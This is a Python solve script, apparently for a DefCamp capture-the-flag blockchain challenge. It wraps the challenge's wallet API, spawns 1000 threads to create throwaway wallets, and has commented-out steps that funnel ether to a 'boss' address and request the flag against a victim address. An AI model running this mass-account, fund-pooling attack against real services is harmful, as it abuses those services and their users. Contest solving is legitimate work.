import requests
url = 'https://blockchain.dctf-quals-17.def.camp'
victim = '0x74e375fb5396fd63d9a48bbbfbcb7c34b7c12c55'
import time
import sys
sys.stdout.flush()
 
 
"""
   "send_money":{
      "from":"address",
      "password":"string",
      "to":"address",
      "amount":"float ether"
   },
"""
 
def send_money(from_, password, to, amount):
    d = {'function': 'send_money',
            'from': from_,
            'password': password,
            'to': to,
            'amount': amount, }
    return requests.post(url, data=d).content
 
"""
   "new_cold_wallet":{
      "password":"string"
   },
"""
def new_cold_wallet(password, result):
    d = {'function': 'new_cold_wallet',
         'password': password,
        }
    x = requests.post(url, data=d).content.strip()[1:-1]
    print(x)
    # result.append(x)
 
 
"""
   "get_balance":{
      "wallet":"address",
      "in_ether":"boolean"
   },
"""
def get_balance(wallet):
    d = {'function': 'get_balance',
         'wallet': wallet,
         'in_ether': 'true'
        }
    return requests.post(url, data=d).content.strip()
 
"""
   "get_flag":{
      "target":"target_address",
      "attacker":"attacker_address",
      "password":"attacker_password"
   },
"""
def get_flag(target, attacker, password):
    d = {'function': 'get_flag',
         'target': target,
         'attacker': attacker,
         'password': password
        }
    x = requests.post(url, data=d).content.strip()
    print(x)
    return x

 
wallets = []
boss = '0x91ef8da431cec71cdc523030b0e487c7d387e61a'
print("this is boss wallet: %s" % boss)
 
# for i in range(1000):
#    w = new_cold_wallet('abc1')
#    print w
#    wallets.append(w)
 
#print wallets
 
#for w in wallets:
#   print send_money(w, 'abc1', boss, 0.05)
#print 'done sending money'
 
#w1 = new_cold_wallet('abc1')
#w2 = new_cold_wallet('abc1')
 
 
#print get_balance(w1)
#print get_balance(w2)
# import concurrent.futures
# with concurrent.futures.ProcessPoolExecutor(max_workers=100) as executor:
#     # Start the load operations and mark each future with its URL
#     ex_list = []
#     for _ in range(100):
#         ex_list.append(executor.submit(new_cold_wallet, 'abc1'))
#     for future in concurrent.futures.as_completed(ex_list):
#         data = future.result()
#         wallets.append(data)
#         print(len(wallets))
from threading import Thread
 
 
results = []
for _ in range(1000):
   time.sleep(2)
   thread = Thread(target=new_cold_wallet, args=('abc1', results))
   thread.start()

# print(results)